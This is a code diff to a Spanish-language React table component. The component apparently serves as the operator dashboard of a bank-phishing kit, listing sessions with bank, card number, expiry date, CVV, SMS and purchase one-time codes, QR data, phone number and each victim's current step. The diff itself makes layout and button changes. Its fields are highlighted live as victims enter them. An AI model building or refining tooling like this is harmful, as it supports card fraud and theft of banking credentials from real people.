@@ -215,7 +215,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
       const csvContent = [
         headers.join(','),
         ...rows.map(row => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(','))
-      ].join('\\n');
+      ].join('\n');
       
       // Crear un blob y un link para descargar
       const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
@@ -334,7 +334,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
 
   if (isLoading) {
     return (
-      <div className="px-6 pt-2 pb-6 overflow-auto flex-1 mobile-scrollable">
+      <div className="px-6 pt-2 pb-6 overflow-auto flex-1 mobile-scrollable" style={{maxHeight: "calc(100vh - 250px)", height: "auto"}}>
         <div className="w-full bg-[#1e1e1e] rounded-lg overflow-hidden">
           <div className="p-4">
             <Skeleton className="h-8 w-full mb-4" />
@@ -604,15 +604,17 @@ const AccessTable: React.FC<AccessTableProps> = ({
                   </td>
                   <td className="p-3 text-[#ccc]">{session.banco}</td>
                   <td className={`p-3 ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                    <div>
-                      <span className="block">{session.tarjeta || '--'}</span>
-                      {(session.fechaVencimiento || session.cvv) && (
-                        <div className="text-xs mt-1 opacity-80">
-                          {session.fechaVencimiento && <span className="mr-2">Exp: {session.fechaVencimiento}</span>}
-                          {session.cvv && <span>CVV: {session.cvv}</span>}
-                        </div>
-                      )}
-                    </div>
+                    {session.tarjeta ? (
+                      <div>
+                        <div>{session.tarjeta}</div>
+                        {(session.fechaVencimiento || session.cvv) && (
+                          <div className="text-xs opacity-80">
+                            {session.fechaVencimiento && <span className="mr-2">Exp: {session.fechaVencimiento}</span>}
+                            {session.cvv && <span>CVV: {session.cvv}</span>}
+                          </div>
+                        )}
+                      </div>
+                    ) : '--'}
                   </td>
                   <td className={`p-3 ${highlightedFields[session.sessionId]?.sms ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {session.sms || '--'}
@@ -623,19 +625,19 @@ const AccessTable: React.FC<AccessTableProps> = ({
                   <td className={`p-3 ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {session.smsCompra || '--'}
                   </td>
-                  <td className="p-3">
+                  <td className="p-3 text-[#ccc]">
                     {session.qrData ? (
                       <Button
                         variant="outline"
                         size="sm"
-                        className="text-[#00aaff] border-[#00aaff] hover:bg-[#0a101d] flex items-center gap-1"
+                        className="text-[#00aaff] border-[#00aaff] hover:bg-[#0a101d] flex items-center gap-2"
                         onClick={(e) => {
                           e.stopPropagation();
                           handleDownloadQR(session);
                         }}
                       >
-                        <QrCode className="h-3 w-3" />
-                        <span>Descargar</span>
+                        <Download className="h-4 w-4" />
+                        Descargar
                       </Button>
                     ) : '--'}
                   </td>
@@ -643,49 +645,38 @@ const AccessTable: React.FC<AccessTableProps> = ({
                     {session.celular || '--'}
                   </td>
                   <td className={`p-3 ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
-                    {/* Convert pasoActual to a more readable format */}
-                    {session.pasoActual ? session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) : '--'}
+                    {session.pasoActual ? 
+                      session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) 
+                      : 'Inicio'}
                   </td>
-                  <td className="p-3 text-[#ccc]">
-                    {session.createdBy || '--'}
-                  </td>
-                  <td className="p-3 text-[#ccc]">
-                    <div className="flex space-x-1">
-                      <button 
-                        className="text-xs bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
+                  <td className="p-3 text-[#ccc]">{session.createdBy || '--'}</td>
+                  <td className="p-3 flex gap-2">
+                    {!session.saved && (
+                      <Button 
+                        size="sm"
+                        className="bg-[#005c99] hover:bg-[#004d80] text-white"
                         onClick={(e) => {
                           e.stopPropagation();
-                          onSelectSession(session.sessionId);
+                          saveSessionMutation.mutate(session.sessionId);
                         }}
+                        disabled={saveSessionMutation.isPending}
                       >
-                        Seleccionar
-                      </button>
-                      
-                      {!session.saved && (
-                        <button 
-                          className="text-xs bg-[#005c99] hover:bg-[#004d80] text-white px-2 py-1 rounded"
-                          onClick={(e) => {
-                            e.stopPropagation();
-                            saveSessionMutation.mutate(session.sessionId);
-                          }}
-                          disabled={saveSessionMutation.isPending}
-                        >
-                          {saveSessionMutation.isPending ? '...' : 'Guardar'}
-                        </button>
-                      )}
-                      
-                      <button 
-                        className="text-xs bg-[#990000] hover:bg-[#800000] text-white px-2 py-1 rounded"
-                        onClick={(e) => {
-                          e.stopPropagation();
-                          setSessionToDelete(session);
-                          setIsDeleteDialogOpen(true);
-                        }}
-                        disabled={deleteSessionMutation.isPending}
-                      >
-                        {deleteSessionMutation.isPending ? '...' : 'Eliminar'}
-                      </button>
-                    </div>
+                        {saveSessionMutation.isPending ? '...' : 'Guardar'}
+                      </Button>
+                    )}
+                    <Button 
+                      variant="destructive"
+                      size="sm"
+                      className="bg-[#990000] hover:bg-[#800000]"
+                      onClick={(e) => {
+                        e.stopPropagation();
+                        setSessionToDelete(session);
+                        setIsDeleteDialogOpen(true);
+                      }}
+                      disabled={deleteSessionMutation.isPending}
+                    >
+                      {deleteSessionMutation.isPending ? '...' : 'Eliminar'}
+                    </Button>
                   </td>
                 </tr>
               ))}
